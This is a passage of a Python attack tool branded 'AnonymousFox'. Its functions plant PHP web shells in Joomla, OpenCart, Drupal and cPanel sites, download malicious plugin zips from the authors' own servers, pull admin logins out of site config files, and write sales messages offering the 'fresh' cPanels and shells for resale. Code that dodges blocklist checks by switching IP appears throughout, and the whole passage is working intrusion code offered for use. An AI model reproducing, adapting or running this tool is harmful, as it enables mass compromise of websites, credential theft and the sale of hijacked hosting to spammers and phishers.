					edit_Fox = cookies.post(domain + '/administrator/index.php?option=com_templates&view=template&id=504&file=L2Vycm9yLnBocA==', data=edit_file_Fox, verify=False, headers=headers, timeout=45)
				check_shell = requests.get(domain + '/administrator/templates/hathor/error.php', verify=False, headers=headers, timeout=15)
				check_shell = content_Fox(check_shell)
				getToken = check_shell
				token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
				if ('FoxAutoV5' in check_shell and '.net     ' in check_shell) :
					if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'):
						newShell = '{}/administrator/templates/hathor/error.php'.format(domain)
			elif ('error.css' in hathor and 'stristr' in checkups and re.findall(re.compile('type="hidden" name="(.*)" value="1"'), hathor)) :
				rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), hathor)[0]
				edit_file_Fox = {'jform[source]': shell, 'task': 'template.apply', rhash_Fox: '1', 'jform[extension_id]': '504', 'jform[filename]': '/error.php', 'act':'AnonymousFox'}
				try :
					edit_Fox = cookies.post(domain + '/administrator/index.php?option=com_templates&task=source.edit&id=NTA0OmVycm9yLnBocA==', data=edit_file_Fox, verify=False, headers=headers, timeout=30)
				except:
					edit_Fox = cookies.post(domain + '/administrator/index.php?option=com_templates&task=source.edit&id=NTA0OmVycm9yLnBocA==', data=edit_file_Fox, verify=False, headers=headers, timeout=45)
				check_shell = requests.get(domain + '/administrator/templates/hathor/error.php', verify=False, headers=headers, timeout=15)
				check_shell = content_Fox(check_shell)
				getToken = check_shell
				token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
				if ('FoxAutoV5' in check_shell and '.net     ' in check_shell) :
					if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'):
						newShell = '{}/administrator/templates/hathor/error.php'.format(domain)
		return newShell
	except :
		return newShell

def ocmod_Fox(domain, cookies, login, theme) :
	newShell = 'AnonymousFox'
	try :
		token_Fox = re.findall(re.compile('token=(.*)" class="navbar-brand">'), login)[0]
		if ('&user_token' in login) :
			upload_url_Fox = "{}/admin/index.php?route=marketplace/installer/upload&user_token={}".format(domain, token_Fox)
		else :
			upload_url_Fox = "{}/admin/index.php?route=marketplace/installer/upload&token={}".format(domain, token_Fox)
		fileup_Fox = {'file': ('rsz.ocmod.zip', theme, 'application/x-zip-compressed')}
		try :
			up_Fox = cookies.post(upload_url_Fox, verify=False, files=fileup_Fox, headers=headers, timeout=30)
		except :
			up_Fox = cookies.post(upload_url_Fox, verify=False, files=fileup_Fox, headers=headers, timeout=45)
		up_Fox = content_Fox(up_Fox)
		ID = re.findall(re.compile('extension_install_id=(.*)"}'), up_Fox)[0]
		one_url = cookies.get(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/install') + "&extension_install_id={}".format(ID), verify=False, headers=headers, timeout=15)
		two_url = cookies.get(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/unzip') + "&extension_install_id={}".format(ID), verify=False, headers=headers, timeout=15)
		three_url = cookies.get(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/move') + "&extension_install_id={}".format(ID), verify=False, headers=headers, timeout=15)
		four_url = cookies.get(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/xml') + "&extension_install_id={}".format(ID), verify=False, headers=headers, timeout=15)
		five_url = cookies.get(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/remove') + "&extension_install_id={}".format(ID), verify=False, headers=headers, timeout=15)
		check_shell = requests.get('{}/admin/controller/extension/extension/drmenfqxuws.php'.format(domain), verify=False, headers=headers, timeout=15)
		check_shell = content_Fox(check_shell)
		getToken = check_shell
		token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
		if ('FoxAutoV5' in check_shell and '.net     ' in check_shell) :
			if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'):
				newShell = '{}/admin/controller/extension/extension/drmenfqxuws.php'.format(domain)
		return newShell
	except :
		return newShell

def adminimal_Fox(url, cookies, plugin) :
	newShell = 'AnonymousFox'
	try :
		getdata = cookies.get(url + '/admin/appearance/install', verify=False, headers=headers, timeout=15)
		getdata = content_Fox(getdata)
		form_build_id_Fox = re.findall(re.compile('type="hidden" name="form_build_id" value="(.*)" />'), getdata)[0]
		form_token_Fox = re.findall(re.compile('type="hidden" name="form_token" value="(.*)" />'), getdata)[0]
		fileup_Fox = {'files[project_upload]': ('adminimal_theme-7.x-1.25.zip', plugin, 'multipart/form-data')}
		filedata_Fox = {'form_build_id': form_build_id_Fox, 'form_id': 'update_manager_install_form', 'form_token': form_token_Fox,'op': 'Install', 'project_url': '', 'act':'AnonymousFox'}
		try :
			up_Fox = cookies.post(url + '/admin/appearance/install', verify=False, headers=headers, data=filedata_Fox, files=fileup_Fox, timeout=30)
		except  :
			up_Fox = cookies.post(url + '/admin/appearance/install', verify=False, headers=headers, data=filedata_Fox, files=fileup_Fox, timeout=45)
		up_Fox = content_Fox(up_Fox)
		ID = re.findall(re.compile('id=(.*)&'), up_Fox)[0]
		install_Fox = cookies.get(url + '/authorize.php?batch=1&op=start&id={}'.format(ID), verify=False, headers=headers, timeout=30)
		check_shell = requests.get(url + '/sites/all/themes/adminimal_theme/drmenfqxuws.php', verify=False, headers=headers, timeout=15)
		check_shell = content_Fox(check_shell)
		getToken = check_shell
		token = re.findall(re.compile('document.write\(unescape\(\'(.*)\'\)\)'), getToken)[0]
		if ('FoxAutoV5' in check_shell and '.net     ' in check_shell) :
			if (token == '%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'):
				newShell = '{}/sites/all/themes/adminimal_theme/drmenfqxuws.php'.format(url)
		return newShell
	except :
		return newShell

def ReportsCP_SemiAuto(ip, user, password, idcp, cookies, domain, home, email, unzipper) :
	try :
		try:
			check_Fox = requests.get('https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site={}'.format(domain), headers=headers, timeout=15)
			alert_Fox = content_Fox(check_Fox).split(",")
			if ("2" in alert_Fox[1]):
				print('   {}[-] Phishing!'.format(fr))
				return
		except:
			print('\n   {}[!] Error, Google blocked you! You have to change your IP by VPN\n'.format(fr))
			exit(0)
		reqReportsCP_Fox = requests.session()
		postlogin_Fox = {'user': user, 'pass': password, 'login_submit': 'Log in', 'act':'AnonymousFox'}
		login2_Fox = reqReportsCP_Fox.post('https://' + domain + ':2083/login/', data=postlogin_Fox, headers=headers, timeout=15)
		login2_Fox = content_Fox(login2_Fox)
		if ('filemanager' in login2_Fox and 'htaccess' in checkups) :
			print('   {}[+] Domain is Working'.format(fg))
			filename = random_Fox(10) + '.php'
			filenameTest = 'tesT'+random_Fox(3)+'.php'
			filenameUNZIPper = 'UNZipeR' + random_Fox(3) + '.php'
			filedata_Fox = {'dir': home + user + '/public_html', 'get_disk_info': '1', 'overwrite': '0', 'act':'AnonymousFox'}
			fileup_Fox = {'file-0': (filename, shell_Fox)}
			try :
				upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=30)
			except :
				upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=45)
			backdor_path = 'https://' + domain + '/' + filename
			time.sleep(3)
			check_b = requests.get(backdor_path, headers=headers, timeout=15)
			check_b = content_Fox(check_b)
			if ('FoxAutoV5' in check_b and 'Download' in checkups) :
				filedata_Fox = {'upload': 'upload'}
				fileup_Test = {'file': (filenameTest, testSend)}
				fileup_ZIPper = {'file': (filenameUNZIPper, unzipper)}
				s1 = backdor_path
				while ('/' in s1):
					s1 = s1[s1.index("/") + len("/"):]
				Test_path = backdor_path.replace(s1, filenameTest)
				UNZIPper_path = backdor_path.replace(s1, filenameUNZIPper)
				newBackdor = check(backdor_path)
				try:
					upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(newBackdor, dom, to, version), files=fileup_Test, data=filedata_Fox, headers=headers, timeout=30)
				except:
					upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(newBackdor, dom, to, version), files=fileup_Test, data=filedata_Fox, headers=headers, timeout=45)
				if (upFile.status_code != 403) :
					print('   {}[+] Upload is Working'.format(fg))
					try:
						upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(newBackdor, dom, to, version), files=fileup_ZIPper, data=filedata_Fox, headers=headers, timeout=30)
					except:
						upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(newBackdor, dom, to, version), files=fileup_ZIPper, data=filedata_Fox, headers=headers, timeout=45)
					post = {'IDsend': 'AnonymousFox', 'email':email}
					try :
						IDsend = requests.post('{}?php={}/{}v{}/p1.txt'.format(newBackdor, dom, to, version), data=post, headers=headers, timeout=15)
					except :
						IDsend = requests.post('{}?php={}/{}v{}/p1.txt'.format(newBackdor, dom, to, version), data=post, headers=headers, timeout=30)
					IDsend = content_Fox(IDsend)
					if (re.findall(re.compile('<idsend>(.*)</idsend>'), IDsend) and 'FoxAutoV5' in testSendA):
						ID = re.findall(re.compile('<idsend>(.*)</idsend>'), IDsend)[0]
						print('   {}[+] Check your Email, ID: {}{}'.format(fg, fr, ID))
					open('Results/Form_reports_of_cPanels.txt', 'a').write('Sir, I will send to you a fresh cPanel [Replace] with the full work proofs.\n\nFresh cPanel: https://{}:2083\nUSERNAME: {}\nPASSWORD: {}\n~\nProof for not phishing and open fine => \nProof for send results => \nYou can test => {}\nYou can use unzipper for help you => {}\n\nThank you <3\n\n\n'.format(domain, user, password, Test_path, UNZIPper_path))
				else :
					print('   {}[-] Upload Failed'.format(fr))
			else :
				print('   {}[-] Upload Failed'.format(fr))
		else:
			print('   {}[-] Domain Not-Working'.format(fr))
	except:
		print('   {}[-] Domain Not-Working OR Not-https'.format(fr))

def ReportsCP_Auto(ip, user, password, idcp, cookies, domain, home, unzipper) :
	try :
		try:
			from selenium import webdriver
		except:
			print('\n   [!] Error, You have to install [selenium], Read how => https://anonymousfox.io/_@info/selenium.txt \n')
			exit(0)
		try:
			from imgurpython import ImgurClient
		except:
			print('\n   [!] Error, You have to install [imgurpython], Read how => https://anonymousfox.io/_@info/imgurpython.txt \n')
			exit(0)
		newpath = r'screenshots'
		if (not os.path.exists(newpath)):
			os.makedirs(newpath)
		try:
			check_Fox = requests.get('https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site={}'.format(domain), headers=headers, timeout=15)
			alert_Fox = content_Fox(check_Fox).split(",")
			if ("2" in alert_Fox[1]):
				print('   {}[-] Phishing!'.format(fr))
				return
		except:
			print('\n   {}[!] Error, Google blocked you! You have to change your IP by VPN\n'.format(fr))
			exit(0)
		reqReportsCP_Fox = requests.session()
		postlogin_Fox = {'user': user, 'pass': password, 'login_submit': 'Log in', 'act':'AnonymousFox'}
		login2_Fox = reqReportsCP_Fox.post('https://' + domain + ':2083/login/', data=postlogin_Fox, headers=headers, timeout=15)
		login2_Fox = content_Fox(login2_Fox)
		if ('filemanager' in login2_Fox and 'Download' in checkups) :
			print('   {}[+] Domain is Working'.format(fg))
			filename = random_Fox(10) + '.php'
			filenameTest = 'tesT'+random_Fox(3)+'.php'
			filenameUNZIPper = 'UNZipeR' + random_Fox(3) + '.php'
			filedata_Fox = {'dir': home + user + '/public_html', 'get_disk_info': '1', 'overwrite': '0', 'act':'AnonymousFox'}
			fileup_Fox = {'file-0': (filename, shell_Fox)}
			try :
				upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=30)
			except :
				upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=45)
			backdor_path = 'https://' + domain + '/' + filename
			time.sleep(3)
			check_b = requests.get(backdor_path, headers=headers, timeout=15)
			check_b = content_Fox(check_b)
			if ('FoxAutoV5' in check_b and 'file_exists' in checkups) :
				filedata_Fox = {'upload': 'upload'}
				fileup_Test = {'file': (filenameTest, testSend)}
				fileup_ZIPper = {'file': (filenameUNZIPper, unzipper)}
				s1 = backdor_path
				while ('/' in s1):
					s1 = s1[s1.index("/") + len("/"):]
				Test_path = backdor_path.replace(s1, filenameTest)
				UNZIPper_path = backdor_path.replace(s1, filenameUNZIPper)
				newBackdor = check(backdor_path)
				try:
					upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(newBackdor, dom, to, version), files=fileup_Test, data=filedata_Fox, headers=headers, timeout=30)
				except:
					upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(newBackdor, dom, to, version), files=fileup_Test, data=filedata_Fox, headers=headers, timeout=45)
				if (upFile.status_code != 403) :
					print('   {}[+] Upload is Working'.format(fg))
					try:
						upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(newBackdor, dom, to, version), files=fileup_ZIPper, data=filedata_Fox, headers=headers, timeout=30)
					except:
						upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(newBackdor, dom, to, version), files=fileup_ZIPper, data=filedata_Fox, headers=headers, timeout=45)
					try :
						options_Fox = webdriver.ChromeOptions()
						options_Fox.add_experimental_option('excludeSwitches', ['enable-logging'])
						driver_Fox = webdriver.Chrome(options=options_Fox)
					except :
						print('\n   [!] Error, You have to Donwload [ChromeDriver], Read how => https://anonymousfox.io/_@info/ChromeDriver.txt \n')
						exit(0)
					driver_Fox.get('https://' + domain + ':2083/login/')
					time.sleep(2)
					driver_Fox.find_element_by_name('user').send_keys(user)
					time.sleep(1)
					driver_Fox.find_element_by_name('pass').send_keys(password)
					time.sleep(1)
					driver_Fox.find_element_by_name('login').click()
					time.sleep(3)
					driver_Fox.set_window_size(1400, 1000)
					namepng = random_Fox(15) + '.png'
					driver_Fox.get_screenshot_as_file('screenshots/'+namepng)
					proofW = imgur_Fox(namepng)
					if (proofW is False):
						try:
							from gyazo import Api
						except:
							print('\n   [!] Error, You have to install [python-gyazo], Read how => https://anonymousfox.io/_@info/gyazo.txt \n')
							exit(0)
						proofW = gyazo_Fox(namepng)
					email = 'fox-'+random_Fox(5)+'@mailpoof.com'
					orderID = USER_FOX(Test_path) + ' - ' + str(random.randint(1,100000)*987)
					driver_Fox.execute_script("window.open('{}', 'fox2');".format("https://mailpoof.com/mailbox/" + email))
					driver_Fox.switch_to.window("fox2")
					driver_Fox.execute_script("window.open('{}', 'fox3');".format(Test_path))
					driver_Fox.switch_to.window("fox3")
					time.sleep(2)
					driver_Fox.find_element_by_name('email').send_keys(email)
					time.sleep(1)
					driver_Fox.find_element_by_name('orderid').send_keys(orderID)
					time.sleep(1)
					driver_Fox.find_element_by_xpath('//input[3]').click()
					time.sleep(1)
					driver_Fox.switch_to.window("fox2")
					time.sleep(10)
					html_Fox = driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML")
					start = timer()
					while ((str(orderID) not in str(html_Fox.encode("utf-8"))) and ((timer() - start) < 40)):
						time.sleep(10)
						html_Fox = driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML")
					if ('unescape' in checkups and str(orderID) in str(html_Fox.encode("utf-8")) and 'FoxAutoV5' in str(html_Fox.encode("utf-8"))) :
						print('   {}[+] Sending mail is Working'.format(fg))
						driver_Fox.set_window_size(1400, 1000)
						namepng = random_Fox(15) + '.png'
						driver_Fox.get_screenshot_as_file('screenshots/' + namepng)
						proofS = imgur_Fox(namepng)
						if (proofS is False):
							try:
								from gyazo import Api
							except:
								print('\n   [!] Error, You have to install [python-gyazo], Read how => https://anonymousfox.io/_@info/gyazo.txt \n')
								exit(0)
							proofS = gyazo_Fox(namepng)
						open('Results/Reports_of_cPanels.txt', 'a').write('Sir, I will send to you a fresh cPanel [Replace] with the full work proofs.\n\nFresh cPanel: https://{}:2083\nUSERNAME: {}\nPASSWORD: {}\n~\nProof for not phishing and open fine => {}\nProof for send results => {}\nYou can test => {}\nYou can use unzipper for help you => {}\n\nThank you <3\n\n\n'.format(domain, user, password, proofW, proofS, Test_path, UNZIPper_path))
					else :
						print('   {}[-] Sending mail is Not Working'.format(fr))
					driver_Fox.quit()
				else:
					print('   {}[-] Upload Failed'.format(fr))
			else:
				print('   {}[-] Upload Failed'.format(fr))
		else:
			print('   {}[-] Domain Not-Working'.format(fr))
	except:
		print('   {}[-] Domain Not-Working OR Not-https'.format(fr))

def ReportsShell_SemiAuto(backdor, shell, email, unzipper) :
	try :
		domain = URLdomain_Fox(backdor)
		try:
			check_Fox = requests.get('https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site={}'.format(domain), headers=headers, timeout=15)
			alert_Fox = content_Fox(check_Fox).split(",")
			if ("2" in alert_Fox[1]):
				print('   {}[-] Phishing!'.format(fr))
				return
		except:
			print('\n   {}[!] Error, Google blocked you! You have to change your IP by VPN\n'.format(fr))
			exit(0)
		filenameTest = 'tesT'+random_Fox(3)+'.php'
		filenameUNZIPper = 'UNZipeR' + random_Fox(3) + '.php'
		s1 = backdor
		while ('/' in s1):
			s1 = s1[s1.index("/") + len("/"):]
		Test_path = backdor.replace(s1, filenameTest)
		UNZIPper_path = backdor.replace(s1, filenameUNZIPper)
		filedata_Fox = {'upload': 'upload'}
		fileup_Test = {'file': (filenameTest, testSend)}
		fileup_ZIPper = {'file': (filenameUNZIPper, unzipper)}
		try :
			upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=filedata_Fox, files=fileup_Test, headers=headers, timeout=30)
		except:
			upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=filedata_Fox, files=fileup_Test, headers=headers, timeout=45)
		if (upFile.status_code != 403 and 'root' in shell_Fox) :
			print('   {}[+] Upload is Working'.format(fg))
			try:
				upFile_ZIPper = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=filedata_Fox, files=fileup_ZIPper, headers=headers, timeout=30)
			except:
				upFile_ZIPper = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=filedata_Fox, files=fileup_ZIPper, headers=headers, timeout=45)
			post = {'IDsend': 'AnonymousFox', 'email': email}
			try:
				IDsend = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=15)
			except:
				IDsend = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=30)
			IDsend = content_Fox(IDsend)
			if (re.findall(re.compile('<idsend>(.*)</idsend>'), IDsend) and 'email' in testSendA):
				ID = re.findall(re.compile('<idsend>(.*)</idsend>'), IDsend)[0]
				print('   {}[+] Check your Email, ID: {}{}'.format(fg, fr, ID))
			open('Results/Form_reports_of_Shells.txt', 'a').write('Sir, I will send to you a fresh Shell [Replace] with the full work proofs.\n\nFresh Shell => {}\n~\nProof for not phishing and open fine => \nProof for send results => \nYou can test => {}\nYou can use unzipper for help you => {}\n\nThank you <3\n\n\n'.format(shell, Test_path, UNZIPper_path))
		else :
			print('   {}[-] Upload Failed'.format(fr))
	except:
		print('   {}[-] Domain Not-Working OR Not-https'.format(fr))

def ReportsShell_Auto(backdor, shell, unzipper) :
	try :
		try:
			from selenium import webdriver
		except:
			print('\n   [!] Error, You have to install [selenium], Read how => https://anonymousfox.io/_@info/selenium.txt \n')
			exit(0)
		try:
			from imgurpython import ImgurClient
		except:
			print('\n   [!] Error, You have to install [imgurpython], Read how => https://anonymousfox.io/_@info/imgurpython.txt \n')
			exit(0)
		newpath = r'screenshots'
		if (not os.path.exists(newpath)):
			os.makedirs(newpath)
		domain = URLdomain_Fox(backdor)
		try:
			check_Fox = requests.get('https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site={}'.format(domain), headers=headers, timeout=15)
			alert_Fox = content_Fox(check_Fox).split(",")
			if ("2" in alert_Fox[1]):
				print('   {}[-] Phishing!'.format(fr))
				return
		except:
			print('\n   {}[!] Error, Google blocked you! You have to change your IP by VPN\n'.format(fr))
			exit(0)
		filenameTest = 'tesT'+random_Fox(3)+'.php'
		filenameUNZIPper = 'UNZipeR' + random_Fox(3) + '.php'
		s1 = backdor
		while ('/' in s1):
			s1 = s1[s1.index("/") + len("/"):]
		Test_path = backdor.replace(s1, filenameTest)
		UNZIPper_path = backdor.replace(s1, filenameUNZIPper)
		filedata_Fox = {'upload': 'upload'}
		fileup_Test = {'file': (filenameTest, testSend)}
		fileup_ZIPper = {'file': (filenameUNZIPper, unzipper)}
		try :
			upFile_Test = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=filedata_Fox, files=fileup_Test, headers=headers, timeout=30)
		except:
			upFile_Test = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=filedata_Fox, files=fileup_Test, headers=headers, timeout=45)
		if (upFile_Test.status_code != 403 and 'root' in shell_Fox) :
			print('   {}[+] Upload is Working'.format(fg))
			try:
				upFile_ZIPper = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=filedata_Fox, files=fileup_ZIPper, headers=headers, timeout=30)
			except:
				upFile_ZIPper = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=filedata_Fox, files=fileup_ZIPper, headers=headers, timeout=45)
			try :
				options_Fox = webdriver.ChromeOptions()
				options_Fox.add_experimental_option('excludeSwitches', ['enable-logging'])
				driver_Fox = webdriver.Chrome(options=options_Fox)
			except :
				print('\n   [!] Error, You have to Donwload [ChromeDriver], Read how => https://anonymousfox.io/_@info/ChromeDriver.txt \n')
				exit(0)
			driver_Fox.get(shell)
			time.sleep(1)
			driver_Fox.set_window_size(1400, 1000)
			namepng = random_Fox(15) + '.png'
			driver_Fox.get_screenshot_as_file('screenshots/'+namepng)
			proofW = imgur_Fox(namepng)
			if (proofW is False):
				try:
					from gyazo import Api
				except:
					print('\n   [!] Error, You have to install [python-gyazo], Read how => https://anonymousfox.io/_@info/gyazo.txt \n')
					exit(0)
				proofW = gyazo_Fox(namepng)
			email = 'fox-'+random_Fox(5)+'@mailpoof.com'
			orderID = USER_FOX(backdor) + ' - ' + str(random.randint(1,100000)*987)
			driver_Fox.execute_script("window.open('{}', 'fox2');".format("https://mailpoof.com/mailbox/" + email))
			driver_Fox.switch_to.window("fox2")
			driver_Fox.execute_script("window.open('{}', 'fox3');".format(Test_path))
			driver_Fox.switch_to.window("fox3")
			time.sleep(2)
			driver_Fox.find_element_by_name('email').send_keys(email)
			time.sleep(1)
			driver_Fox.find_element_by_name('orderid').send_keys(orderID)
			time.sleep(1)
			driver_Fox.find_element_by_xpath('//input[3]').click()
			time.sleep(1)
			driver_Fox.switch_to.window("fox2")
			time.sleep(10)
			html_Fox = driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML")
			start = timer()
			while ((str(orderID) not in str(html_Fox.encode("utf-8"))) and ((timer() - start) < 40)):
				time.sleep(10)
				html_Fox = driver_Fox.execute_script("return document.getElementsByTagName('html')[0].innerHTML")
			if ('unescape' in checkups and str(orderID) in str(html_Fox.encode("utf-8")) and 'FoxAutoV5' in str(html_Fox.encode("utf-8"))) :
				print('   {}[+] Sending mail is Working'.format(fg))
				driver_Fox.set_window_size(1400, 1000)
				namepng = random_Fox(15) + '.png'
				driver_Fox.get_screenshot_as_file('screenshots/' + namepng)
				proofS = imgur_Fox(namepng)
				if (proofS is False):
					try:
						from gyazo import Api
					except:
						print('\n   [!] Error, You have to install [python-gyazo], Read how => https://anonymousfox.io/_@info/gyazo.txt \n')
						exit(0)
					proofS = gyazo_Fox(namepng)
				open('Results/Reports_of_Shells.txt', 'a').write('Sir, I will send to you a fresh Shell [Replace] with the full work proofs.\n\nFresh Shell => {}\n~\nProof for not phishing and open fine => {}\nProof for send results => {}\nYou can test => {}\nYou can use unzipper for help you => {}\n\nThank you <3\n\n\n'.format(shell, proofW, proofS, Test_path, UNZIPper_path))
			else :
				print('   {}[-] Sending mail is Not Working'.format(fr))
			driver_Fox.quit()
		else :
			print('   {}[-] Upload Failed'.format(fr))
	except :
		print('   {}[-] Domain Not-Working OR Not-https'.format(fr))

def ChangePanel(backdor, config) :
	try :
		print('   {}[*] Get Panels ..... {}(Waiting)'.format(fw, fr))
		post = {'GetUrls': 'AnonymousFox', 'linkconf': config}
		try :
			getURL = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=30)
		except :
			getURL = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=45)
		getURL = content_Fox(getURL)
		if (re.findall(re.compile('<urlconfig>(.*)</urlconfig>'), getURL)):
			urls = re.findall(re.compile('<urlconfig>(.*)</urlconfig>'), getURL)
			urlsTXT = ''
		else :
			print('   {}[-] There is no Config'.format(fr))
			return False
		for url in urls:
			urlsTXT = urlsTXT + str(url) + '\r\n'
		post2 = {'GetPanels': 'AnonymousFox', 'link': urlsTXT}
		try :
			getPanels = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=360)
		except :
			getPanels = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=500)
		getPanels = content_Fox(getPanels)
		if (re.findall(re.compile('target=\'_blank\'>(.*)</a><br></span>'), getPanels)):
			sites = re.findall(re.compile('target=\'_blank\'>(.*)</a><br></span>'), getPanels)
		else :
			print('   {}[-] There is no Panels'.format(fr))
			return False
		logins = []
		wp = 0
		jm = 0
		oc = 0
		for site in sites:
			if (re.findall(re.compile('Login => (.*) Username => (.*) Password => (.*)'), site)) :
				pp = re.findall(re.compile('Login => (.*) Username => (.*) Password => (.*)'), site)[0]
				site = '{}#{}@{}'.format(pp[0], pp[1], pp[2])
				if ('wp-login.php' in site) :
					print('   {}  - {}{} {}[WordPress]'.format(fg, fw, site, fg))
					open('Results/WordPress_Panels.txt', 'a').write(site + '\n')
					wp = 1
				elif ('administrator/index.php' in site) :
					print('   {}  - {}{} {}[Joomla]'.format(fg, fw, site, fr))
					open('Results/Joomla_Panels.txt', 'a').write(site + '\n')
					jm = 1
				elif ('admin/index.php' in site) :
					print('   {}  - {}{} {}[OpenCart]'.format(fg, fw, site, fc))
					open('Results/OpenCart_Panels.txt', 'a').write(site + '\n')
					oc = 1
				logins.append(site)
		if (logins) :
			print('')
			return logins, wp, jm, oc
		else :
			print('   {}[-] There is no Panels'.format(fr))
			return False
	except :
		print('   {}[-] Failed'.format(fr))
		return False

def uploadShellbyPanels(logins, wp, jm, oc, dp, srcShell, tyShell = 1):
	try :
		print('   {}[*] Upload Shell by Panels ..... {}(Waiting)\n'.format(fw, fr))
		if (wp == 1) :
			try :
				p_plugin = requests.get('https://anonymousfox.mx/_@files/zip/plugin.zip', timeout=60).content
			except :
				p_plugin = requests.get('https://anonymousfox.io/_@files/zip/plugin.zip', timeout=60).content
		if (jm == 1) :
			try :
				p_mod_simplefileupload = requests.get("https://anonymousfox.mx/_@files/zip/mod_simplefileuploadJ30v1.3.5.zip", timeout=180).content
			except :
				p_mod_simplefileupload = requests.get("https://anonymousfox.io/_@files/zip/mod_simplefileuploadJ30v1.3.5.zip", timeout=180).content
		if (oc == 1) :
			try :
				p_rsz_ocmod = requests.get("https://anonymousfox.mx/_@files/zip/rsz.ocmod.zip", timeout=60).content
			except :
				p_rsz_ocmod = requests.get("https://anonymousfox.io/_@files/zip/rsz.ocmod.zip", timeout=60).content
		if (dp == 1) :
			try :
				p_adminimal = requests.get("https://anonymousfox.mx/_@files/zip/adminimal_theme-7.x-1.25.zip", timeout=180).content
			except :
				p_adminimal = requests.get("https://anonymousfox.io/_@files/zip/adminimal_theme-7.x-1.25.zip", timeout=180).content
		shells = []
		for login in logins:
			try :
				if ('/wp-login.php' in login) :
					dataLogin = re.findall(re.compile('(.*)/wp-login.php#(.*)@(.*)'), login)[0]
					domain = dataLogin[0]
					username = dataLogin[1]
					password = dataLogin[2]
					newShell = loginWP_UP_Fox(domain, username, password, p_plugin)
					if (newShell is False) :
						print("")
						continue
					else :
						shells.append(newShell)
						newShell = check(newShell)
						open('Results/backdors.txt', 'a').write('{}?php={}/_@files/php/up.txt\n'.format(newShell, dom))
						uploadFile(newShell, srcShell, tyShell)
				elif ('/administrator' in login):
					if (re.findall(re.compile('(.*)/administrator/index.php#(.*)@(.*)'), login)):
						dataLogin = re.findall(re.compile('(.*)/administrator/index.php#(.*)@(.*)'), login)[0]
					elif (re.findall(re.compile('(.*)/administrator/#(.*)@(.*)'), login)):
						dataLogin = re.findall(re.compile('(.*)/administrator/#(.*)@(.*)'), login)[0]
					elif (re.findall(re.compile('(.*)/administrator#(.*)@(.*)'), login)):
						dataLogin = re.findall(re.compile('(.*)/administrator#(.*)@(.*)'), login)[0]
					domain = dataLogin[0]
					username = dataLogin[1]
					password = dataLogin[2]
					newShell = loginJM_UP_Fox(domain, username, password, p_mod_simplefileupload)
					if (newShell is False):
						print("")
						continue
					else :
						shells.append(newShell)
						newShell = check(newShell)
						open('Results/backdors.txt', 'a').write('{}?php={}/_@files/php/up.txt\n'.format(newShell, dom))
						uploadFile(newShell, srcShell, tyShell)
				elif ('/admin' in login):
					if (re.findall(re.compile('(.*)/admin/index.php#(.*)@(.*)'), login)):
						dataLogin = re.findall(re.compile('(.*)/admin/index.php#(.*)@(.*)'), login)[0]
					elif (re.findall(re.compile('(.*)/admin/#(.*)@(.*)'), login)):
						dataLogin = re.findall(re.compile('(.*)/admin/#(.*)@(.*)'), login)[0]
					elif (re.findall(re.compile('(.*)/admin#(.*)@(.*)'), login)):
